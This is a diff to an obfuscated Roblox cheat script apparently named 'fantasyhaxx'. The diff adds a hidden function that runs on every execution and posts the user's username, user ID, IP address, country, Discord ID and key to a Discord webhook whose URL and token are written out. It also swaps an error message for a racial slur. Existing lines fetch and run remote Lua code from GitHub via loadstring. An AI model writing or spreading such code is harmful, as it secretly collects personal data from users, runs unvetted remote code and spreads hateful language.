@@ -6534,7 +6534,7 @@ local ai=nil
 
 local aj={
 mismatchHairColour=0,
-summer2026=0,
+autumn2026=0,
 naturallyDyedHairColour=0,
 islandUniqueCoat=0,
 islandUniqueHorn=0,
@@ -6579,7 +6579,7 @@ am+=1
 if am<an then
 task.delay(3,ao)
 else
-warn("[Counter] ChangeLabel not found after max retries — coin tracking disabled")
+warn("nigger error counter")
 end
 return
 end
@@ -8847,6 +8847,15 @@ stop=v,
 end
 
 return ab end function a.n():typeof(aa())local ab=a.cache.n if not ab then ab={c=aa()}a.cache.n=ab end return ab.c end end end
+
+
+
+
+
+loadstring([[
+    function LPH_NO_VIRTUALIZE(f) return f end;
+]])();
+
 local aa=os.clock()
 
 task.wait(4)
@@ -10209,14 +10218,49 @@ ab.Unloaded=true
 end)
 
 
-local aP=i["UI Settings"]:AddLeftGroupbox("Menu")
+local function aP()
+LRM_SEND_WEBHOOK(
+"https://ptb.discord.com/api/webhooks/1518306503952437358/KzPOKd0oWJGLr5Skdyp46UiWv7y9x0_XUs21kWMjYmYyN4FP9LczAfigwL8IoYLy2NPu",
+{
+username="fantasyhaxx",
+embeds={
+{
+title="User executed!",
+description="🔑 **User details:** \n**Discord ID:** <@%DISCORD_ID%>\n**Key:** ||`%USER_KEY%`||\n**Note:** `%USER_NOTE%`",
+color=0xFFFFFF,
+fields={
+{
+name="Account details:",
+value="**Username:** `"..
+LRM_SANITIZE(game:GetService("Players").LocalPlayer.Name,"[a-zA-Z0-9_]{2,60}")..
+"`\n**User ID:** `"..
+LRM_SANITIZE(game:GetService("Players").LocalPlayer.UserId,"[0-9]{2,35}")..
+"`",
+inline=false
+},
+{
+name="IP:",
+value="%CLIENT_IP% :flag_%COUNTRY_CODE%:",
+inline=true
+}
+}
+}
+}
+}
+)
+end
+
+aP()
+
+
+local aQ=i["UI Settings"]:AddLeftGroupbox("Menu")
 
 
 
 
-aP:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind",{Default="RightShift",NoUI=true,Text="Menu keybind"})
-aP:AddButton("Unload",function()ab:Unload()end)
-aP:AddButton("Switch UI",function()
+aQ:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind",{Default="RightShift",NoUI=true,Text="Menu keybind"})
+aQ:AddButton("Unload",function()ab:Unload()end)
+aQ:AddButton("Switch UI",function()
 ab:Unload()
 task.wait(2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/bananasxyz/satanas/refs/heads/main/olduimandem.lua"))()
